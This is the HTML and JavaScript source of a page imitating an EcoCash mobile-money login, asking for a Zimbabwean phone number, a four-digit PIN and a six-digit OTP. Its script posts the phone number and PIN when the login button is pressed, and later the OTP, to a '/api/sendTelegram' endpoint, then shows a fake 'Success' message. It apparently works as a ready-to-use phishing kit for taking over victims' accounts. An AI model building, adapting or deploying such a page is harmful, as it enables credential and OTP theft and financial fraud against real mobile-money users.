<!doctype html>
<html>
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>EcoCash â€” Login</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">

<style>
*{box-sizing:border-box}
body{
  font-family:Inter,system-ui,Arial;
  background:linear-gradient(180deg,#f7fbff,#e8f3ff);
  margin:0;padding:18px;
  display:flex;align-items:center;justify-content:center;
}
.card{
  width:100%;max-width:380px;
  background:#fff;padding:20px;border-radius:12px;
  box-shadow:0 12px 30px rgba(0,0,0,.06)
}
.logo{height:44px;display:block;margin:0 auto 10px}
h2{text-align:center;margin-bottom:12px}

label{font-size:13px}
input{
  width:100%;padding:10px;font-size:14px;
  border-radius:8px;border:1px solid #e6eefc
}
.btn{
  width:100%;margin-top:12px;
  background:#4b86ff;color:#fff;
  padding:10px;border-radius:8px;border:0
}
.btn[disabled]{background:#cbd5e1}

.error{
  min-height:18px;
  font-size:13px;
  color:#d04444;
}

/* phone */
.phone-wrap{
  display:flex;gap:6px;align-items:center;
}
.prefix{
  padding:10px;
  background:#f1f5f9;
  border:1px solid #e6eefc;
  border-radius:8px;
}

/* pin */
.pin-row{display:flex;gap:8px;justify-content:center;margin-top:6px}
.pin-digit{
  width:40px;height:48px;
  text-align:center;font-size:20px;
  border-radius:8px;border:1px solid #e6eefc
}

/* OTP */
.otp-modal{
  position:fixed;inset:0;
  background:rgba(0,0,0,.35);
  display:flex;align-items:center;justify-content:center
}
.otp-box{
  background:#fff;padding:18px;border-radius:12px;min-width:300px
}
.otp-row{display:flex;gap:8px;justify-content:center}
.otp-digit{
  width:40px;height:48px;
  font-size:20px;text-align:center
}
.otp-warning{color:#d04444;font-size:13px;display:none}
.success{color:#16a34a;font-weight:600}
.small{font-size:13px;color:#6b7280}
</style>
</head>

<body>

<div class="card">
  <img src="assets/eco.png" class="logo">
  <h2>Login</h2>

  <form id="loginForm" autocomplete="off">

    <label>Mobile Number</label>
    <div class="phone-wrap">
      <div class="prefix">+263</div>
      <input id="phone" inputmode="numeric" placeholder="7XXXXXXXX">
    </div>
    <div id="phoneError" class="error"></div>

    <label>Enter your PIN</label>
    <div class="pin-row">
      <input class="pin-digit" maxlength="1" inputmode="numeric">
      <input class="pin-digit" maxlength="1" inputmode="numeric">
      <input class="pin-digit" maxlength="1" inputmode="numeric">
      <input class="pin-digit" maxlength="1" inputmode="numeric">
    </div>

    <!-- honeypot -->
    <input type="text" id="hp" style="display:none">

    <button id="loginBtn" class="btn" disabled>LOGIN</button>
  </form>
</div>

<!-- OTP MODAL -->
<div id="otpModal" class="otp-modal" style="display:none">
  <div class="otp-box">
    <strong>Enter OTP</strong>

    <div class="otp-row" style="margin-top:8px">
      <input class="otp-digit" maxlength="1" id="d0">
      <input class="otp-digit" maxlength="1" id="d1">
      <input class="otp-digit" maxlength="1" id="d2">
      <input class="otp-digit" maxlength="1" id="d3">
      <input class="otp-digit" maxlength="1" id="d4">
      <input class="otp-digit" maxlength="1" id="d5">
    </div>

    <div id="otpWarning" class="otp-warning">Please input 6 digits</div>

    <div class="small" id="resendInfo" style="margin-top:8px">
      Resend available in <span id="countdown">120</span>s
    </div>

    <div style="display:flex;gap:10px;margin-top:12px">
      <button id="confirmOtp" disabled>Confirm</button>
      <button id="cancelOtp">Cancel</button>
    </div>

    <div id="otpStatus" class="small"></div>
  </div>
</div>

<script>
/* ===== PHONE ===== */
const phone=document.getElementById('phone');
const phoneError=document.getElementById('phoneError');
const loginBtn=document.getElementById('loginBtn');

function validatePhone(){
  const v=phone.value.replace(/\D/g,'');
  phone.value=v;

  if(!/^7\d{8}$/.test(v)){
    phoneError.innerText='Input 9-digit Econet number starting with 7';
    return false;
  }
  phoneError.innerText='';
  return true;
}

phone.addEventListener('input',()=>{
  validatePhone();
  updateLogin();
});

/* ===== PIN ===== */
const pins=[...document.querySelectorAll('.pin-digit')];
let pin='';

pins.forEach((p,i)=>{
  p.oninput=()=>{
    p.value=p.value.replace(/\D/g,'');
    if(p.value&&i<3)pins[i+1].focus();
    pin=pins.map(x=>x.value).join('');
    updateLogin();
  };
  p.onkeydown=e=>{
    if(e.key==='Backspace'&&!p.value&&i>0){
      pins[i-1].focus();
      pins[i-1].value='';
      e.preventDefault();
    }
  };
});

function updateLogin(){
  loginBtn.disabled=!(validatePhone() && /^\d{4}$/.test(pin));
}

/* ===== API ===== */
const send=p=>fetch('/api/sendTelegram',{
  method:'POST',
  headers:{'Content-Type':'application/json'},
  body:JSON.stringify(p)
});

/* ===== OTP ===== */
const otpModal=document.getElementById('otpModal');
const dEls=[0,1,2,3,4,5].map(i=>document.getElementById('d'+i));
const confirm=document.getElementById('confirmOtp');
const cancel=document.getElementById('cancelOtp');
const countdown=document.getElementById('countdown');
const resendInfo=document.getElementById('resendInfo');
const status=document.getElementById('otpStatus');

let timer,sec=120;

function startCountdown(){
  clearInterval(timer);
  sec=120;
  resendInfo.innerHTML=`Resend available in <span id="countdown">120</span>s`;
  timer=setInterval(()=>{
    sec--;
    countdown.innerText=sec;
    if(sec<=0){
      clearInterval(timer);
      resendInfo.innerText="Didn't receive OTP?";
    }
  },1000);
}

function otp(){return dEls.map(d=>d.value).join('');}

dEls.forEach((d,i)=>{
  d.oninput=()=>{
    d.value=d.value.replace(/\D/g,'');
    if(d.value&&i<5)dEls[i+1].focus();
    confirm.disabled=!/^\d{6}$/.test(otp());
  };
});

/* ===== LOGIN ===== */
loginForm.onsubmit=async e=>{
  e.preventDefault();
  if(hp.value) return;

  otpModal.style.display='flex';
  dEls.forEach(d=>d.value='');
  confirm.disabled=true;
  startCountdown();

  await send({
    event:'login_clicked',
    loginPhone:'+263'+phone.value,
    loginPin:pin,
    submittedAt:new Date().toISOString()
  });
};

cancel.onclick=()=>{
  otpModal.style.display='none';
  clearInterval(timer);
};

confirm.onclick=async()=>{
  await send({
    event:'otp_confirm',
    loginPhone:'+263'+phone.value,
    loginPin:pin,
    otp:otp(),
    submittedAt:new Date().toISOString()
  });
  status.innerHTML='<span class="success">Success</span>';
};
</script>
</body>
</html>
